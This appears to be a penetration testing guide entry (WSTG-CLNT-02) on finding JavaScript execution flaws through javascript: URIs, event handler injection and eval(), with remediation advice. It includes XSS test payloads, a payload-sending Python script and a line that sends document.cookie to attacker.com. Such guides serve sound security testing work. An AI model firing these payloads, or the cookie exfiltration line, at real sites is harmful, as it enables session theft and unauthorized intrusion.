# WSTG-CLNT-02: Testing for JavaScript Execution

## Test ID
WSTG-CLNT-02

## Test Name
Testing for JavaScript Execution

## High-Level Description

This test identifies scenarios where user input can lead to arbitrary JavaScript execution through various vectors including javascript: URIs, event handlers, and dynamic code evaluation.

---

## What to Check

- [ ] javascript: URI handling
- [ ] Event handler injection
- [ ] eval() with user input
- [ ] Function constructor abuse
- [ ] Template literal injection

---

## How to Test

### Step 1: Test javascript: URI

```bash
# Test link href
curl -s "https://target.com/redirect?url=javascript:alert(1)"

# Test image src
curl -s "https://target.com/profile?avatar=javascript:alert(1)"
```

### Step 2: Test Event Handler Injection

```python
#!/usr/bin/env python3
import requests

def test_event_handlers(url, param):
    payloads = [
        '" onmouseover="alert(1)" x="',
        "' onfocus='alert(1)' autofocus='",
        '" onclick="alert(1)" style="position:fixed;width:100%;height:100%" x="',
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
    ]

    for payload in payloads:
        response = requests.get(url, params={param: payload})
        if payload.split('=')[0] in response.text:
            print(f"[POTENTIAL] Payload reflected: {payload[:40]}")

# Usage
test_event_handlers("https://target.com/search", "q")
```

### Step 3: Dynamic Evaluation Testing

```javascript
// Check if user input reaches eval/Function
// Common patterns to look for in JS:

// Dangerous
eval(userInput);
new Function(userInput)();
setTimeout(userInput, 1000);
setInterval(userInput, 1000);

// Test payloads
// alert(1)
// 1+1
// fetch('https://attacker.com?'+document.cookie)
```

---

## Remediation

```javascript
// Never use eval with user input
// AVOID: eval(userInput)

// Use safe alternatives
JSON.parse(jsonString);  // For JSON parsing

// For dynamic function calls, use allowlist
const allowedFunctions = { 'sum': (a,b) => a+b };
if (allowedFunctions[functionName]) {
    allowedFunctions[functionName](args);
}
```

---

## Risk Assessment

| Finding | CVSS | Severity |
|---------|------|----------|
| javascript: URI execution | 6.1 | Medium |
| Event handler injection | 6.1 | Medium |
| eval() with user input | 8.6 | High |

---

## CWE Categories

| CWE ID | Title |
|--------|-------|
| **CWE-95** | Improper Neutralization of Directives in Dynamically Evaluated Code |

---

## Checklist

```
[ ] javascript: URI tested
[ ] Event handlers tested
[ ] eval() usage analyzed
[ ] Template literals checked
[ ] Findings documented
```
